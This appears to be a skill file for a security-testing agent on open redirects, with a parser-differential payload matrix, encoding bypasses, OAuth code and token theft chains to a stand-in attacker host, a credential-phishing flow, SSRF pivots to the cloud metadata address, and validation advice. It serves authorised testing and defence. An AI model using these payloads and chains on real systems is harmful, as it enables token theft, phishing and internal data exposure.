---
name: open-redirect
description: Open redirect testing for phishing pivots, OAuth token theft, and allowlist bypass
---

# Open Redirect

Open redirects enable phishing, OAuth/OIDC code and token theft, and allowlist bypass in server-side fetchers that follow redirects. Treat every redirect target as untrusted: canonicalize and enforce exact allowlists per scheme, host, and path.

## Attack Surface

**Server-Driven Redirects**
- HTTP 3xx Location

**Client-Driven Redirects**
- `window.location`, meta refresh, SPA routers

**OAuth/OIDC/SAML Flows**
- `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `returnTo`/`continue`/`next`

**Multi-Hop Chains**
- Only first hop validated

## High-Value Targets

- Login/logout, password reset, SSO/OAuth flows
- Payment gateways, email links, invite/verification
- Unsubscribe, language/locale switches
- `/out` or `/r` redirectors

## Reconnaissance

### Injection Points

- Params: `redirect`, `url`, `next`, `return_to`, `returnUrl`, `continue`, `goto`, `target`, `callback`, `out`, `dest`, `back`, `to`, `r`, `u`
- OAuth/OIDC/SAML: `redirect_uri`, `post_logout_redirect_uri`, `RelayState`, `state`
- SPA: `router.push`/`replace`, `location.assign`/`href`, meta refresh, `window.open`
- Headers: `Host`, `X-Forwarded-Host`/`Proto`, `Referer`; server-side Location echo

### Parser Differentials

**Userinfo**
- `https://trusted.com@evil.com` → validators parse host as trusted.com, browser navigates to evil.com
- Variants: `trusted.com%40evil.com`, `a%40evil.com%40trusted.com`

**Backslash and Slashes**
- `https://trusted.com\evil.com`, `https://trusted.com\@evil.com`, `///evil.com`, `/\evil.com`

**Whitespace and Control**
- `http%09://evil.com`, `http%0A://evil.com`, `trusted.com%09evil.com`

**Fragment and Query**
- `trusted.com#@evil.com`, `trusted.com?//@evil.com`, `?next=//evil.com#@trusted.com`

**Unicode and IDNA**
- Punycode/IDN: `truѕted.com` (Cyrillic), `trusted.com。evil.com` (full-width dot), trailing dot

### Per-Language Parser Differentials

An open redirect is almost always a disagreement between the parser the
**validator** uses and the parser the **browser/fetcher** uses. The matrix
below is the extracted host from each stack's standard parser, verified
empirically (Python 3.14 `urllib.parse.urlparse().hostname`, PHP 8.4
`parse_url(PHP_URL_HOST)`, Node 24 `url.parse().hostname`, Go 1.26 `net/url`
`Hostname()`, Ruby 3.3 `URI.parse().host`, and WHATWG `new URL().hostname`,
which is also what a browser navigates to). Two families emerge — **lenient**
(Python / PHP / Node legacy: treat `\` as an ordinary character) and **strict**
(Go / Ruby: reject `\` and control characters) — and both diverge from WHATWG.

| Payload | Lenient (Python/PHP/Node `url.parse`) | Strict (Go/Ruby) | WHATWG (`new URL` / browser) | Exploit condition |
|---|---|---|---|---|
| `https://evil.com\@good.com` | `good.com` (backslash kept in userinfo) | throw | `evil.com` (`\`→`/`, so host is `evil.com`) | **lenient validator passes `good.com`, browser navigates `evil.com`** — the headline bypass |
| `https://good.com\@evil.com` | `evil.com` | throw | `good.com` | reverse: a WHATWG-based validator passes `good.com` while a lenient one blocks it |
| `https:/evil.com` (one slash) | no host | empty / nil | `evil.com` | any validator treating "no host ⇒ relative ⇒ safe" is bypassed — browser resolves to `evil.com` |
| `https:evil.com` (no slash) | no host | empty / nil | `evil.com` | same as above |
| `/\evil.com` | no host (relative) | Go empty / Ruby throw | resolves to `//evil.com` → `evil.com` on navigation | validator sees a relative path; browser navigates external |

Two rules follow. (1) A `\` before the `@`/host on a special scheme is the
most reliable allowlist bypass against Python/PHP/Node-`url.parse` validators,
because only WHATWG converts `\`→`/`. (2) The scheme-with-one-or-zero-slash
forms (`https:/evil.com`, `https:evil.com`) look host-less to every server
parser but are real navigations in a browser — deadly when the validator's
logic is "if `urlparse(x).hostname` is not in the allowlist *and not empty*,
allow" (empty ⇒ assumed same-origin).

Fingerprint the target's stack, then re-run this matrix against its actual
parser rather than assuming — the reproduction harness:
```bash
python3 -c "from urllib.parse import urlparse as u;print(u('https://evil.com\\\\@good.com').hostname)"   # good.com
node   -e "console.log(new URL('https://evil.com\\\\@good.com').hostname)"                                 # evil.com
php    -r "echo parse_url('https://evil.com\\@good.com', PHP_URL_HOST);"                                   # good.com
```
`new URL(x)` throws on a base-less scheme-relative input (`//evil.com`,
`/\evil.com`), so a validator wrapping it in `try{}catch{reject}` is safe for
those — but if the app then forwards the *raw* value to a `Location:` header
or `location =`, the browser still navigates to `evil.com`. Validate the
value you actually emit, not a re-parse of it.

### Encoding Bypasses

- Double encoding: `%2f%2fevil.com`, `%252f%252fevil.com`
- Mixed case and scheme smuggling: `hTtPs://evil.com`, `http:evil.com`
- IP variants: decimal 2130706433, octal 0177.0.0.1, hex 0x7f.1, IPv6 `[::ffff:127.0.0.1]`
- User-controlled path bases: `/out?url=/\evil.com`

## Key Vulnerabilities

### Allowlist Evasion

**Common Mistakes**
- Substring/regex contains checks: allows `trusted.com.evil.com`
- Wildcards: `*.trusted.com` also matches `attacker.trusted.com.evil.net`
- Missing scheme pinning: `data:`, `javascript:`, `file:`, `gopher:` accepted
- Case/IDN drift between validator and browser

**Robust Validation**
- Canonicalize with a single modern URL parser (WHATWG URL)
- Compare exact scheme, hostname (post-IDNA), and an explicit allowlist with optional exact path prefixes
- Require absolute HTTPS; reject protocol-relative `//` and unknown schemes

### OAuth/OIDC/SAML

**Redirect URI Abuse**
- Using an open redirect on a trusted domain for redirect_uri enables code interception
- Weak prefix/suffix checks: `https://trusted.com` → `https://trusted.com.evil.com`
- Path traversal/canonicalization: `/oauth/../../@evil.com`
- `post_logout_redirect_uri` often less strictly validated

**Chaining an open redirect into code/token theft.** OAuth `redirect_uri`
must be an *exact registered* value, so a standalone open redirect on the
same trusted domain is the pivot that defeats exact-match validation:

1. The client registered `redirect_uri = https://app.example/callback` (exact).
2. `app.example` also hosts an open redirect at `/out?url=`.
3. Request authorization with the registered value but land on the redirector:
   `.../authorize?client_id=...&response_type=code&redirect_uri=https://app.example/out?url=https://attacker.tld/`
   — the IdP's exact match still passes (`redirect_uri` host/path is
   `app.example/out`, which may be registered or prefix-allowed), the code is
   delivered to `app.example/out`, which 302s to `attacker.tld` **with the
   `code`/`token` in the query or fragment**.
4. For the implicit/hybrid flow the `access_token`/`id_token` rides the
   fragment; a redirector that preserves the fragment (or a `response_mode`
   the app reflects) leaks it. Chain with a Referer leak when the redirect is
   a subresource.

Redirect-URI matching is itself a parser-differential surface (apply the
matrix above): the IdP validates one representation, the client's callback
handler parses another. Test `redirect_uri` with the backslash, single-slash,
userinfo, and encoded-slash payloads — a lenient IdP validator that extracts
`app.example` from `https://app.example\@attacker.tld` sends the code to the
browser's host, `attacker.tld`. Also test registration-time wildcards
(`https://*.app.example/cb` → register/takeover a sibling), and
`post_logout_redirect_uri`, `RelayState`, and `state`-carried return URLs,
which are routinely validated more weakly than `redirect_uri`.

### Client-Side Vectors

**JavaScript Redirects**
- `location.href`/`assign`/`replace` using user input
- Meta refresh `content=0;url=USER_INPUT`
- SPA routers: `router.push(searchParams.get('next'))`

**Client-Side Redirect Sink Catalog**

Trace the source (URL query/hash, `postMessage`, storage) to a navigation
sink; a `javascript:`/`data:` value in any of these is DOM-XSS, a
cross-origin `https:` value is open redirect:
- `location`, `location.href`, `location.assign()`, `location.replace()`, `window.open()`
- `<meta http-equiv=refresh content="0;url=...">` injected into the DOM
- framework routers that call the above from a query/hash param: React Router `navigate()`, Next.js `router.push()`/`redirect()`, Vue Router `router.push()`, Angular `Router.navigateByUrl()`
- `<a href>` / `<form action>` / `<base href>` set from input
- server-issued `Location` echoed from a client value

Two client-only nuances the server-side matrix misses:
- **Scheme not validated** — `location = params.get('next')` with `next=javascript:alert(1)` executes (self-XSS→redirect chain); allowlist the scheme, not just the host.
- **Same-origin path that the router re-fetches** — a `next=/\evil.com` handed to `router.push` can become a cross-origin navigation after the browser normalizes `/\`→`//`. Load `browser_security` for the client-side path-traversal / navigation state-machine (source decoding, router vs `fetch` differences, and how each browser resolves the final URL).

### Reverse Proxies and Gateways

- Host/X-Forwarded-* may change absolute URL construction
- CDNs that follow redirects for link checking can leak tokens when chained

### SSRF Chaining

- Server-side fetchers (web previewers, link unfurlers) follow 3xx
- Combine with an open redirect on an allowlisted domain to pivot to internal targets (169.254.169.254, localhost)

## Exploitation Scenarios

### OAuth Code Interception

1. Set redirect_uri to `https://trusted.example/out?url=https://attacker.tld/cb`
2. IdP sends code to trusted.example which redirects to attacker.tld
3. Exchange code for tokens; demonstrate account access

### Phishing Flow

1. Send link on trusted domain: `/login?next=https://attacker.tld/fake`
2. Victim authenticates; browser navigates to attacker page
3. Capture credentials/tokens via cloned UI

### Internal Evasion

1. Server-side link unfurler fetches `https://trusted.example/out?u=http://169.254.169.254/latest/meta-data`
2. Redirect follows to metadata; confirm via timing/headers

## Testing Methodology

1. **Inventory surfaces** - Login/logout, password reset, SSO/OAuth flows, payment gateways, email links
2. **Build test matrix** - Scheme × host × path variants and encoding/unicode forms
3. **Compare behaviors** - Server-side validation vs browser navigation results
4. **Multi-hop testing** - Trusted-domain → redirector → external
5. **Prove impact** - Credential phishing, OAuth code interception, internal egress

## Validation

1. Produce a minimal URL that navigates to an external domain via the vulnerable surface; include the full address bar capture
2. Show bypass of the stated validation (regex/allowlist) using canonicalization variants
3. Test multi-hop: prove only first hop is validated and second hop escapes constraints
4. For OAuth/SAML, demonstrate code/RelayState delivery to an attacker-controlled endpoint

## False Positives

- Redirects constrained to relative same-origin paths with robust normalization
- Exact pre-registered OAuth redirect_uri with strict verifier
- Validators using a single canonical parser and comparing post-IDNA host and scheme
- User prompts that show the exact final destination before navigating

## Impact

- Credential and token theft via phishing and OAuth/OIDC interception
- Internal data exposure when server fetchers follow redirects
- Policy bypass where allowlists are enforced only on the first hop
- Cross-application trust erosion and brand abuse

## Pro Tips

1. Always compare server-side canonicalization to real browser navigation; differences reveal bypasses
2. Try userinfo, protocol-relative, Unicode/IDN, and IP numeric variants early
3. In OAuth, prioritize `post_logout_redirect_uri` and less-discussed flows; they're often looser
4. Exercise multi-hop across distinct subdomains and paths
5. For SSRF chaining, target services known to follow redirects
6. Favor allowlists of exact origins plus optional path prefixes
7. Use the verified per-language parser matrix above and fingerprint the target's actual stack rather than spraying blind; for the general validator-vs-consumer disagreement model this is an instance of, load `semantic_confusion`

## Summary

Redirection is safe only when the final destination is constrained after canonicalization. Enforce exact origins, verify per hop, and treat client-provided destinations as untrusted across every stack.
